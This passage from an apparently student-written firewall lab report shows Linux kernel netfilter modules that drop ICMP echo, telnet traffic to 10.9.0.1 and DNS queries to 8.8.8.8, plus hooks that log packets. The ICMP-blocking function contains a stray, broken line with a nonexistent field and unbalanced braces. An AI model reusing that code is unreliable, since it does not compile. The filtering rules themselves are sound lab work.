class="line">    <span class="comment">// Convert the IPv4 address from dotted decimal to 32-bit binary</span></span><br><span class="line">    in4_pton(ip, <span class="number">-1</span>, (u8 *)&amp;ip_addr, <span class="string">&#x27;\0&#x27;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (iph-&gt;protocol == IPPROTO_ICMP) &#123;</span><br><span class="line">        icmph = icmp_hdr(skb);</span><br><span class="line">        <span class="keyword">if</span> (iph-&gt;daddr == ip_addr &amp;&amp; icmph-&gt;type == ICMP_ECHO ) &#123;<span class="comment">//&amp;&amp;</span></span><br><span class="line">            ntohs(icmph-&gt;dest) == port)&#123;</span><br><span class="line">                printk(KERN_WARNING <span class="string">&quot;*** Dropping %pI4 (ICMP/ping)&quot;</span>,</span><br><span class="line">                       &amp;(iph-&gt;daddr));</span><br><span class="line">                <span class="keyword">return</span> NF_DROP;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// block telnet to 10.9.0.1</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">blockTelnet</span><span class="params">(<span class="type">void</span> *priv, <span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">                             <span class="type">const</span> <span class="keyword">struct</span> nf_hook_state *state)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcph</span>;</span></span><br><span class="line">        u16 port = <span class="number">23</span>; <span class="comment">// telnet</span></span><br><span class="line">        <span class="type">char</span> ip[<span class="number">16</span>] = <span class="string">&quot;10.9.0.1&quot;</span>;</span><br><span class="line">        u32 ip_addr;</span><br><span class="line">        <span class="keyword">if</span> (!skb) <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">        iph = ip_hdr(skb);</span><br><span class="line">        <span class="comment">// Convert the IPv4 address from dotted decimal to 32-bit binary</span></span><br><span class="line">        in4_pton(ip, <span class="number">-1</span>, (u8 *)&amp;ip_addr, <span class="string">&#x27;\0&#x27;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">            tcph = tcp_hdr(skb);</span><br><span class="line">            <span class="keyword">if</span> (iph-&gt;daddr == ip_addr &amp;&amp; ntohs(tcph-&gt;dest) == port)&#123;</span><br><span class="line">                printk(KERN_WARNING <span class="string">&quot;*** Dropping %pI4 (TCP/telnet), port %d\n&quot;</span>,</span><br><span class="line">                       &amp;(iph-&gt;daddr), port);</span><br><span class="line">                <span class="keyword">return</span> NF_DROP;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// block udp to 8.8.8.8</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">blockUDP</span><span class="params">(<span class="type">void</span> *priv, <span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">                          <span class="type">const</span> <span class="keyword">struct</span> nf_hook_state *state)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">udphdr</span> *<span class="title">udph</span>;</span></span><br><span class="line">        u16 port = <span class="number">53</span>; <span class="comment">// DNS</span></span><br><span class="line">        <span class="type">char</span> ip[<span class="number">16</span>] = <span class="string">&quot;8.8.8.8&quot;</span>;</span><br><span class="line">        u32 ip_addr;</span><br><span class="line">        <span class="keyword">if</span> (!skb) <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">        iph = ip_hdr(skb);</span><br><span class="line">        <span class="comment">// Convert the IPv4 address from dotted decimal to 32-bit binary</span></span><br><span class="line">        in4_pton(ip, <span class="number">-1</span>, (u8 *)&amp;ip_addr, <span class="string">&#x27;\0&#x27;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (iph-&gt;protocol == IPPROTO_UDP) &#123;</span><br><span class="line">            udph = udp_hdr(skb);</span><br><span class="line">            <span class="keyword">if</span> (iph-&gt;daddr == ip_addr &amp;&amp; ntohs(udph-&gt;dest) == port)&#123;</span><br><span class="line">                printk(KERN_WARNING <span class="string">&quot;*** Dropping %pI4 (UDP), port %d\n&quot;</span>,</span><br><span class="line">                       &amp;(iph-&gt;daddr), port);</span><br><span class="line">                <span class="keyword">return</span> NF_DROP;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">printInfo</span><span class="params">(<span class="type">void</span> *priv, <span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">                           <span class="type">const</span> <span class="keyword">struct</span> nf_hook_state *state)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span>;</span></span><br><span class="line">        <span class="type">char</span> *hook;</span><br><span class="line">        <span class="type">char</span> *protocol;</span><br><span class="line">        <span class="keyword">switch</span> (state-&gt;hook)&#123;</span><br><span class="line">            <span class="keyword">case</span> NF_INET_LOCAL_IN: hook = <span class="string">&quot;LOCAL_IN&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> NF_INET_LOCAL_OUT: hook = <span class="string">&quot;LOCAL_OUT&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> NF_INET_PRE_ROUTING: hook = <span class="string">&quot;PRE_ROUTING&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> NF_INET_POST_ROUTING: hook = <span class="string">&quot;POST_ROUTING&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> NF_INET_FORWARD: hook = <span class="string">&quot;FORWARD&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>: hook = <span class="string">&quot;IMPOSSIBLE&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;*** %s\n&quot;</span>, hook); <span class="comment">// Print out the hook info</span></span><br><span class="line">        iph = ip_hdr(skb);</span><br><span class="line">        <span class="keyword">switch</span> (iph-&gt;protocol)&#123;</span><br><span class="line">            <span class="keyword">case</span> IPPROTO_UDP: protocol = <span class="string">&quot;UDP&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IPPROTO_TCP: protocol = <span class="string">&quot;TCP&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IPPROTO_ICMP: protocol = <span class="string">&quot;ICMP&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>: protocol = <span class="string">&quot;OTHER&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Print out the IP addresses and protocol</span></span><br><span class="line">        printk(KERN_INFO <span class="string">&quot; %pI4 --&gt; %pI4 (%s)\n&quot;</span>,</span><br><span class="line">               &amp;(iph-&gt;saddr), &amp;(iph-&gt;daddr), protocol);</span><br><span class="line">        <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">registerFilter</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;seedBlock:Registering filters.\n&quot;</span>);</span><br><span class="line">        hook1.hook = printInfo;</span><br><span class="line">        hook1.hooknum = NF_INET_LOCAL_OUT;</span><br><span class="line">        hook1.pf = PF_INET;</span><br><span class="line">        hook1.priority = NF_IP_PRI_FIRST;</span><br><span class="line">        nf_register_net_hook(&amp;init_net, &amp;hook1);</span><br><span class="line">        hook2.hook = blockUDP;</span><br><span class="line">        hook2.hooknum = NF_INET_POST_ROUTING;</span><br><span class="line">        hook2.pf = PF_INET;</span><br><span class="line">        hook2.priority = NF_IP_PRI_FIRST;</span><br><span class="line">        nf_register_net_hook(&amp;init_net, &amp;hook2);</span><br><span class="line"></span><br><span class="line">        hook3.hook = blockICMP;</span><br><span class="line">        hook3.hooknum = NF_INET_PRE_ROUTING;</span><br><span class="line">        hook3.pf = PF_INET;</span><br><span class="line">        hook3.priority = NF_IP_PRI_FIRST;</span><br><span class="line">        nf_register_net_hook(&amp;init_net, &amp;hook3);</span><br><span class="line"></span><br><span class="line">        hook4.hook = blockTelnet;</span><br><span class="line">        hook4.hooknum = NF_INET_PRE_ROUTING;</span><br><span class="line">        hook4.pf = PF_INET;</span><br><span class="line">        hook4.priority = NF_IP_PRI_FIRST;</span><br><span class="line">        nf_register_net_hook(&amp;init_net, &amp;hook4);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">void</span> <span class="title function_">removeFilter</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;seedBlock:The filters are being removed.\n&quot;</span>);</span><br><span class="line">        nf_unregister_net_hook(&amp;init_net, &amp;hook1);</span><br><span class="line">        nf_unregister_net_hook(&amp;init_net, &amp;hook2);</span><br><span class="line">        nf_unregister_net_hook(&amp;init_net, &amp;hook3);</span><br><span class="line">        nf_unregister_net_hook(&amp;init_net, &amp;hook4);</span><br><span class="line">    &#125;</span><br><span class="line">    module_init(registerFilter);</span><br><span class="line">    module_exit(removeFilter);</span><br><span class="line">    MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="5-3-Task1-B—SeedFilter-c"><a href="#5-3-Task1-B—SeedFilter-c" class="headerlink" title="5.3 Task1.B—SeedFilter.c"></a>5.3 Task1.B—SeedFilter.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter_ipv4.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/udp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/icmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/inet.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span> <span class="title">hook1</span>, <span class="title">hook2</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">blockUDP</span><span class="params">(<span class="type">void</span> *priv, <span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="keyword">struct</span> nf_hook_state *state)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">udphdr</span> *<span class="title">udph</span>;</span></span><br><span class="line">    u16 port = <span class="number">53</span>; <span class="comment">// DNS</span></span><br><span class="line">    <span class="type">char</span> ip[<span class="number">16</span>] = <span class="string">&quot;8.8.8.8&quot;</span>;</span><br><span class="line">    u32 ip_addr;</span><br><span class="line">    <span class="keyword">if</span> (!skb) <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">    iph = ip_hdr(skb);</span><br><span class="line">    <span class="comment">// Convert the IPv4 address from dotted decimal to 32-bit binary</span></span><br><span class="line">    in4_pton(ip, <span class="number">-1</span>, (u8 *)&amp;ip_addr, <span class="string">&#x27;\0&#x27;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (iph-&gt;protocol == IPPROTO_UDP) &#123;</span><br><span class="line">        udph = udp_hdr(skb);</span><br><span class="line">        <span class="keyword">if</span> (iph-&gt;daddr == ip_addr &amp;&amp; ntohs(udph-&gt;dest) == port)&#123;</span><br><span class="line">            printk(KERN_WARNING <span class="string">&quot;*** Dropping %pI4 (UDP), port %d\n&quot;</span>,</span><br><span class="line">                   &amp;(iph-&gt;daddr), port);</span><br><span class="line">            <span class="keyword">return</span> NF_DROP;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">printInfo</span><span class="params">(<span class="type">void</span> *priv, <span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">                       <span class="type">const</span> <span class="keyword">struct</span> nf_hook_state *state)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span>;</span></span><br><span class="line">    <span class="type">char</span> *hook;</span><br><span class="line">    <span class="type">char</span> *protocol;</span><br><span class="line">    <span class="keyword">switch</span> (state-&gt;hook)&#123;</span><br><span class="line">        <span class="keyword">case</span> NF_INET_LOCAL_IN: hook = <span class="string">&quot;LOCAL_IN&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> NF_INET_LOCAL_OUT: hook = <span class="string">&quot;LOCAL_OUT&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> NF_INET_PRE_ROUTING: hook = <span class="string">&quot;PRE_ROUTING&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> NF_INET_POST_ROUTING: hook = <span class="string">&quot;POST_ROUTING&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> NF_INET_FORWARD: hook = <span class="string">&quot;FORWARD&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>: hook = <span class="string">&quot;IMPOSSIBLE&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;*** %s\n&quot;</span>, hook); <span class="comment">// Print out the hook info</span></span><br><span class="line">    iph = ip_hdr(skb);</span><br><span class="line">    <span class="keyword">switch</span> (iph-&gt;protocol)&#123;</span><br><span class="line">        <span class="keyword">case</span> IPPROTO_UDP: protocol = <span class="string">&quot;UDP&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IPPROTO_TCP: protocol = <span class="string">&quot;TCP&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IPPROTO_ICMP: protocol = <span class="string">&quot;ICMP&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>: protocol = <span class="string">&quot;OTHER&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Print out the IP addresses and protocol</span></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot; %pI4 --&gt; %pI4 (%s)\n&quot;</span>,</span><br><span class="line">           &amp;(iph-&gt;saddr), &amp;(iph-&gt;daddr), protocol);</span><br><span class="line">    <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">registerFilter</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Registering filters.\n&quot;</span>);</span><br><span class="line">    hook1.hook = printInfo;</span><br><span class="line">    hook1.hooknum = NF_INET_LOCAL_OUT;</span><br><span class="line">    hook1.pf = PF_INET;</span><br><span class="line">    hook1.priority = NF_IP_PRI_FIRST;</span><br><span class="line">    nf_register_net_hook(&amp;init_net, &amp;hook1);</span><br><span class="line">    hook2.hook = blockUDP;</span><br><span class="line">    hook2.hooknum = NF_INET_POST_ROUTING;</span><br><span class="line">    hook2.pf = PF_INET;</span><br><span class="line">    hook2.priority = NF_IP_PRI_FIRST;</span><br><span class="line">    nf_register_net_hook(&amp;init_net, &amp;hook2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">removeFilter</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;The filters are being removed.\n&quot;</span>);</span><br><span class="line">    nf_unregister_net_hook(&amp;init_net, &amp;hook1);</span><br><span class="line">    nf_unregister_net_hook(&amp;init_net, &amp;hook2);</span><br><span class="line">&#125;</span><br><span class="line">module_init(registerFilter);</span><br><span class="line">module_exit(removeFilter);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="5-4-Task1-B—SeedPrint-c"><a href="#5-4-Task1-B—SeedPrint-c" class="headerlink" title="5.4 Task1.B—SeedPrint.c"></a>5.4 Task1.B—SeedPrint.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter_ipv4.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/udp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/icmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/inet.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span> <span class="title">hook1</span>, <span class="title">hook2</span>,<span class="title">hook3</span>,<span class="title">hook4</span>,<span class="title">hook5</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">blockUDP</span><span class="params">(<span class="type">void</span> *priv, <span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="keyword">struct</span> nf_hook_state *state)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">udphdr</span> *<span class="title">udph</span>;</span></span><br><span class="line">    u16 port = <span class="number">53</span>; <span class="comment">// DNS</span></span><br><span class="line">    <span class="type">char</span> ip[<span class="number">16</span>] = <span class="string">&quot;8.8.8.8&quot;</span>;</span><br><span class="line">    u32 ip_addr;</span><br><span class="line">    <span class="keyword">if</span> (!skb) <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">    iph = ip_hdr(skb);</span><br><span class="line">    <span class="comment">// Convert the IPv4 address from dotted decimal to 32-bit binary</span></span><br><span class="line">    in4_pton(ip, <span class="number">-1</span>, (u8 *)&amp;ip_addr, <span class="string">&#x27;\0&#x27;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (iph-&gt;protocol == IPPROTO_UDP) &#123;</span><br><span class="line">        udph = udp_hdr(skb);</span><br><span class="line">        <span class="keyword">if</span> (iph-&gt;daddr == ip_addr &amp;&amp; ntohs(udph-&gt;dest) == port)&#123;</span><br><span class="line">            printk(KERN_WARNING <span class="string">&quot;*** Dropping %pI4 (UDP), port %d\n&quot;</span>,</span><br><span class="line">                   &amp;(iph-&gt;daddr), port);</span><br><span class="line">            <span class="keyword">return</span> NF_DROP;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">printInfo</span><span class="params">(<span class="type">void</span> *priv, <span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">                       <span class="type">const</span> <span class="keyword">struct</span> nf_hook_state *state)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span>;</span></span><br><span class="line">    <span class="type">char</span> *hook;</span><br><span class="line">    <span class="type">char</span> *protocol;</span><br><span class="line">    <span class="keyword">switch</span> (state-&gt;hook)&#123;</span><br><span class="line">        <span class="keyword">case</span> NF_INET_LOCAL_IN: hook = <span class="string">&quot;LOCAL_IN&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> NF_INET_LOCAL_OUT: hook = <span class="string">&quot;LOCAL_OUT&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> NF_INET_PRE_ROUTING: hook = <span class="string">&quot;PRE_ROUTING&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> NF_INET_POST_ROUTING: hook = <span class="string">&quot;POST_ROUTING&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> NF_INET_FORWARD: hook = <span class="string">&quot;FORWARD&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>: hook = <span class="string">&quot;IMPOSSIBLE&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;*** %s\n&quot;</span>, hook); <span class="comment">// Print out the hook info</span></span><br><span class="line">    iph = ip_hdr(skb);</span><br><span class="line">    <span class="keyword">switch</span> (iph-&gt;protocol)&#123;</span><br><span class="line">        <span class="keyword">case</span> IPPROTO_UDP: protocol = <span class="string">&quot;UDP&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IPPROTO_TCP: protocol = <span class="string">&quot;TCP&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IPPROTO_ICMP: protocol = <span class="string">&quot;ICMP&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>: protocol = <span class="string">&quot;OTHER&quot;</span>; <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Print out the IP addresses and protocol</span></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot; %pI4 --&gt; %pI4 (%s)\n&quot;</span>,</span><br><span class="line">           &amp;(iph-&gt;saddr), &amp;(iph-&gt;daddr), protocol);</span><br><span class="line">    <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">registerFilter</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;seedPrint:Registering filters.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// NF_INET_PRE_ROUTING</span></span><br><span class="line">    hook1.hook = printInfo;</span><br><span class="line">    hook1.hooknum = NF_INET_PRE_ROUTING;</span><br><span class="line">    hook1.pf = PF_INET;</span><br><span class="line">    hook1.priority = NF_IP_PRI_FIRST;</span><br><span class="line">    nf_register_net_hook(&amp;init_net, &amp;hook1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// NF_INET_LOCAL_IN</span></span><br><span class="line">    hook2.hook = printInfo;</span><br><span class="line">    hook2.hooknum = NF_INET_LOCAL_IN;</span><br><span class="line">    hook2.pf = PF_INET;</span><br><span class="line">    hook2.priority = NF_IP_PRI_FIRST;</span><br><span class="line">    nf_register_net_hook(&amp;init_net, &amp;hook2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// NF_INET_FORWARD</span></span><br><span class="line">    hook3.hook = printInfo;</span><br><span class="line">    hook3.hooknum = NF_INET_FORWARD;</span><br><span class="line">    hook3.pf = PF_INET;</span><br><span class="line">    hook3.priority = NF_IP_PRI_FIRST;</span><br><span class="line">    nf_register_net_hook(&amp;init_net, &amp;hook3);</span><br><span class="line">    <span class="comment">// NF_INET_LOCAL_OUT</span></span><br><span class="line">    hook4.hook = printInfo;</span><br><span class="line">    hook4.hooknum = 